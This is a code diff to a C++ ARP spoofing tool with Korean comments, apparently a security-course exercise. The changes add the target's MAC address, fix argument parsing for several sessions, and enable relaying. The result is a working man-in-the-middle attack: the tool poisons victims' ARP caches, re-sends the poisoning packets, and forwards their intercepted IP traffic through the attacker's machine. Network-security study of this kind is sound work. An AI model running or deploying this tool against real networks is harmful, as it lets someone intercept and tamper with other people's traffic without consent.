@@ -18,7 +18,7 @@ struct Session
     Ip   senderIp;
     Mac  senderMac;
     Ip   targetIp;
-    Mac  senderMac;
+    Mac  targetMac;
 
     // sender를 속이는 변조된 arp패킷
     // 지속적으로 감염을 시켜야 하므로 구조체 안에 만들었다.
@@ -116,7 +116,7 @@ int main(int argc, char* argv[]) {
 
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return -1;
@@ -140,6 +140,7 @@ int main(int argc, char* argv[]) {
 
 
     int numOfSession = (argc-2) / 2;
+    printf("number of session: %d\n", numOfSession);
 
     // 세션 배열 할당
     Session* session = new Session[numOfSession];
@@ -150,21 +151,25 @@ int main(int argc, char* argv[]) {
     }
 
     // 세션 IP 입력
-    for(int i = 0; i < numOfSession; i+=2)
+    for(int i = 2; i < argc; i+=2)
     {
-        session[i].senderIp = Ip(argv[i+2]);
-        session[i].targetIp = Ip(argv[i+3]);
+        session[(i/2)-1].senderIp = Ip(argv[i]);
+        session[(i/2)-1].targetIp = Ip(argv[i+1]);
+        printf("[Sess %d] sender IP = %s\n", (i/2)-1, argv[i]);
+        printf("[Sess %d] target IP = %s\n", (i/2)-1, argv[i+1]);
     }
     
-    // sender의 MAC주소 알아오기
+    // sender 및 target MAC주소 알아오기
     // 그리고 ARP infect 패킷 생성
     for(int i = 0; i < numOfSession; i++)
     {
         session[i].senderMac = requestMac(handle, session[i].senderIp);
+        session[i].targetMac = requestMac(handle, session[i].targetIp);
         makeArpInfectPacket(&session[i]);
     }
     
     // 모든 준비는 끝났다!!
+    printf("all ready...\n");
 
     // ARP infect 패킷 전송
     for(int i = 0; i < numOfSession; i++)
@@ -199,16 +204,15 @@ int main(int argc, char* argv[]) {
         {
             if(spoofedPacket->smac() != session[i].senderMac)
                 continue;  // sender의 MAC이 아니면 건너뛴다!
-
+            
             if(spoofedPacket->dmac() != myMac)
                 continue;  // 나한테 온게 아니면 건너뛴다!
 
-            // IP패킷이면 Relay!!
-            /*
+            // IP패킷이면 릴레이
             if(spoofedPacket->type() == EthHdr::Ip4)
             {
-                printf("from %s, spoofed IP packet is captured: %u bytes \n", session[i].senderIp, spoofedPacketSize);
-
+                // dst mac을 target MAC으로 바꾼다.
+                spoofedPacket->dmac_ = session[i].targetMac;
                 // src mac을 나의 MAC으로 바꾼다.
                 spoofedPacket->smac_ = myMac;
 
@@ -217,7 +221,9 @@ int main(int argc, char* argv[]) {
                 if (res != 0) {
                     fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                 }
-            }*/
+
+                printf("[Sess %d] spoofed IP packet is relayed: %u bytes \n", i, spoofedPacketSize);
+            }
 
             // ARP패킷이면
             else if(spoofedPacket->type() == EthHdr::Arp)
@@ -230,6 +236,8 @@ int main(int argc, char* argv[]) {
                 if (res != 0) {
                     fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                 }
+
+                printf("Sess %d] resend infect packet\n", i);
             }
 
         }
